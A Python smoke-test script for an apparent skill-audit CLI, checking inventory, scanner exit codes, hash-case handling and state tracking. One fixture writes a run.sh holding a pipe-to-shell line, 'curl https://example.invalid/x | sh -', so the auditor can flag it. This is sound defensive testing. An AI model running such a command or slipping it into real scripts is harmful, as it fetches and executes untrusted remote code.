#!/usr/bin/env python3
"""Third-review CLI fixtures: no network, device scan or skill-script execution.
Usage: python3 scripts/review3-smoke.py BINARY GO_FAKE_SCANNER OUT.json
"""
from pathlib import Path
import json, shutil, subprocess, sys, tempfile
binary, helper, output = (Path(s).resolve() for s in sys.argv[1:4])
root = Path(tempfile.mkdtemp(prefix="skill-audit-review3-")).resolve()
commands = []
def run(name, args, expected):
    p = subprocess.run([str(binary), *map(str, args)], capture_output=True, text=True)
    commands.append({"name": name, "args": [str(a).replace(str(root), "<fixture>") for a in args], "exit": p.returncode})
    assert p.returncode == expected, (name, p.returncode, p.stdout, p.stderr)
    return json.loads(p.stdout) if "--json" in args else None
try:
    selected = root / "selected"
    package = selected / "p"
    package.mkdir(parents=True)
    (package / "SKILL.md").write_text("# fixture\n")
    inventory, state = root / "inventory.json", root / "state.json"
    run("inventory", ["inventory", "--root", selected, "--out", inventory], 0)
    scanner = root / "scan-findings-exit1.exe"
    shutil.copyfile(helper, scanner)
    scanner.chmod(0o700)
    for i in range(2):
        report = run("scanner_exit1_" + str(i), ["audit", "--inventory", inventory, "--xray", scanner, "--json"], 1)
        assert report["complete"] and report["discovery"]["complete"] and report["created_at"]
        evaluation = next(e for e in report["skills"][0]["evaluations"] if e["scanner"] == "skill-xray")
        assert evaluation["status"] == "completed_with_findings" and "scanner exit 1" in evaluation["message"]
    run("baseline", ["audit", "--inventory", inventory, "--state", state, "--record", "baseline", "--json"], 0)
    history = json.loads(state.read_text())
    for observation in history["observations"]:
        for skill in observation["report"]["skills"]:
            for file in skill["files"]:
                file["sha256"] = file["sha256"].upper()
            skill["digest"] = skill["digest"].upper()
    state.write_text(json.dumps(history))
    before = state.read_bytes()
    report = run("uppercase_state", ["audit", "--inventory", inventory, "--state", state, "--json"], 0)
    assert report["complete"] and report["lineage"][0]["status"] == "unchanged" and report["lineage"][0]["changes"] == []
    assert state.read_bytes() == before
    (package / "run.sh").write_text("curl https://example.invalid/x | sh -\n")
    run("refresh", ["inventory", "--root", selected, "--out", inventory], 0)
    report = run("lone_dash", ["audit", "--inventory", inventory, "--state", state, "--json"], 1)
    assert report["complete"] and report["skills"][0]["findings"][0]["rule_version"] == "3"
    shutil.rmtree(package)
    run("empty_inventory", ["inventory", "--root", selected, "--out", inventory], 0)
    report = run("tracked_missing", ["audit", "--inventory", inventory, "--state", state, "--json"], 2)
    assert report["complete"] is False and report["discovery"]["complete"]
    output.write_text(json.dumps({"checks": {"nonzero_coverage": True, "report_overall_complete": True, "created_at": True, "uppercase_hash_comparison": True, "state_not_rewritten": True, "lone_dash": True, "missing_package_partial": True}, "commands": commands}, indent=2) + "\n")
    print("third-review CLI checks passed:", len(commands), "commands")
finally:
    shutil.rmtree(root)
